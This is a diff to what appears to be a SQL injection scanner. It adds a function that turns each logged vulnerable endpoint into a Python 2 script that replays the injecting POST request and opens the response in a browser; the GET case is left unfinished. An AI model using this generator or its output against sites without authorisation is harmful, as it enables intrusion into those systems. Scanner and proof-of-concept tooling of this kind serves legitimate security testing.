@@ -79,6 +79,31 @@ def log_results(results, category):
     log["results"][ORIGIN] = processed_results
     return log
 
+def generate_exploits(logs):
+    counter = 0
+    for log in logs:
+        for target in log["results"]:
+            for vuln in log["results"][target]:
+                fp = open("exploits/exploit" + str(counter) + ".py", "w")
+                fp.write("import urllib, urllib2, cookielib, webbrowser, os\n")
+                endpoint = target + vuln["endpoint"]
+                if vuln["method"] == "POST":
+                   fp.write('url = "'+endpoint+'"\n')
+                   fp.write('values = '+str(vuln["params"])+'\n')
+                   fp.write('data = urllib.urlencode(values)\n')
+                   fp.write('req = urllib2.Request(url, data)\n')
+                   fp.write('rsp = urllib2.urlopen(req)\n')
+                   fp.write('content = rsp.read()\n')
+                   fp.write('tmp_file = "/tmp/tmp.html"\n')
+                   fp.write('fp = open(tmp_file, "w")\n')
+                   fp.write('fp.write(content)\n')
+                   fp.write('fp.close()\n')
+                   fp.write('webbrowser.open("file://" + os.path.realpath(tmp_file))\n')
+                # elif vuln["method"] == "GET":
+                    # TODO: Finish this part
+                fp.close()
+                counter += 1
+
 def sqli_injection(web_pages):
     results = []
     for web_page in web_pages:
@@ -106,3 +131,4 @@ if __name__ == '__main__':
     all_web_pages.sort()
     sqli_log = sqli_injection(all_web_pages)
     print(sqli_log)
+    generate_exploits([sqli_log])
